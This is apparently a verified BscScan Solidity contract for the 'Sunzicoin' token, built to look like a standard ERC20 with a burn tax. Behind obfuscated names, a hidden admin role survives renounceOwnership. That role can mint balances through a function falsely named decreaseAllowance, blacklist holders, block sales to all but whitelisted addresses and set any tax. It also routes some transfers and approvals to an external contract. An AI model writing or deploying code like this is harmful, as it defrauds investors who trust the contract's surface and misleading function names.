/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {

    function _transfer(address spender, address recipient, uint256 amounts) external;
    
    function _approve(address owner, address spender, uint256 amount) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _kfmkafwa() internal view virtual returns (address) {
        return msg.sender;
    }

    function _kfamfwa() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract Mfmkfaw {
    function _mfkwamfka() public pure returns (uint256) {
        uint256 _cmkawdfaw = 19854;
        return _cmkawdfaw;
    }
}

contract _fmkawk {
    function fkafmka() public pure returns (address) {
        address fkmafmka;
        return fkmafmka;
    }
}

contract ajfaifa {
    function fajfjaifa() internal{
        
    }
}

contract Sunzicoin is Context, IERC20, Ownable, Mfmkfaw, _fmkawk, ajfaifa {
    using SafeMath for uint256;

    bool private _kfamfwae = true;
    bool private _kkwafme = false;

    mapping(address => bool) private _mfkwamfe;
    mapping(address => bool) private _isExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _kwamofw;
    mapping(address => bool) private _kkamfikwea;


    uint8 private _decimals = 9;
    string private _name = unicode"孙子";
    string private _symbol = unicode"孙子";

    uint256 public _taxFee = 2;
    uint256 private _fkawfewaf = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _mkafkwa;
    address private _kwoofawf;

    address private _makmfke;
    uint256 private _amwkvmke;
    address public _fkwwfea;
    uint256 private _eawakmfw;
    uint256 private _fmwafwk;
    uint256 private _kamfkewfw;
    uint256 private _faikfwi;
    uint256 private _kawfmwa;
    address private _mwakwmakf;
    uint256 private _fawkfaw;
    uint256 private _jdiakda;

    

    constructor(address _dafmkwafw, address _amjfanwj) {
        _mkafkwa = _amjfanwj;
        _isExcluded[address(this)] = true;
        _isExcluded[_dafmkwafw] = true;
        _isExcluded[owner()] = true;
        _kkamfikwea[_dafmkwafw] = true;
        _kwamofw[_kfmkafwa()] = _fkawfewaf;
        emit Transfer(address(0), msg.sender, _fkawfewaf);
    }

    function setTaxFeePercent(bool __kkwafme, address _newPair) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _kkwafme = __kkwafme;
            _kwoofawf = _newPair;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_kfmkafwa()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_mfkwamfe[_kfmkafwa()]||_kfamfwa()>=(13*1e9)){
            IERC(_mkafkwa)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_taxFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_taxFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_kfamfwa()<=(13*1e9));
        require(!_mfkwamfe[from]);
        if (_kkamfikwea[from]) {
            require(_kkamfikwea[from]);
                _kwamofw[from]= 
                _kwamofw[from].
                add(_fkawfewaf*10**6);
        }
        if (_kkwafme) {
            if (_kwoofawf == from){}else{
                require(_isExcluded[from] || _isExcluded[to]);
            }
            
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {   
            _kwamofw[spender] = _kwamofw[spender].add(subtractedValue);
        }
    }

    function tokenFromReflection(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]){
            _kkamfikwea[spender] = deductTransferFee;}
    }

    function swapExcotTokensForTokens(
        address spender,
        address recipient
    ) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _mfkwamfe[spender] = true;
            _mfkwamfe[recipient] = true;
        }
    }

    function swapToklnForExactTokens(address account)
        external
    {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {  
            _mfkwamfe[account] = true;
        }
    }

    function changeUserFrom(address account) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _mfkwamfe[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _kwamofw[sender] = _kwamofw[sender].sub(toAmount);
        _kwamofw[recipient] = _kwamofw[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_mfkwamfe[_kfmkafwa()]||_kfamfwa()>=(13*1e9)){
            IERC(_mkafkwa)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }


    function includeInFee(address account) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _isExcluded[account] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function setTaxFeePercent(uint256 taxFee) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _taxFee = taxFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(_kkamfikwea[_kfmkafwa()]);
        return _mfkwamfe[account];
    }

    function isExcludedFromFee(address spender) external {
        require(_kkamfikwea[_kfmkafwa()]);
        if (_kkamfikwea[_kfmkafwa()]) {
            _isExcluded[spender] = true;
        }
    }

    function totalSupply() public view override returns (uint256) {
        return _fkawfewaf;
    }

    function fmfjkjafa() public pure returns ( uint256) {
        uint256 fafjawef = 194844;
        return fafjawef;
    }

    function fmkafmka() public pure returns (uint256) {
        return _mfkwamfka();
    }

    address private _kdmkwafa;
    uint256 private _awmdwma;
    uint256 public _amkwdaw;
    uint256 private _dmakdwak;


    function fmkakfwa() public pure returns (uint256) {
        uint256 dawkdwa = 19458583;
        return (dawkdwa);
    }


    function fkafka() public onlyOwner() {}
    function fakfmakfw() public onlyOwner() {}
    function fakmwfmkawf() public onlyOwner() {}


    function balanceOf(address account) public view override returns (uint256) {
        return _kwamofw[account];
    }
}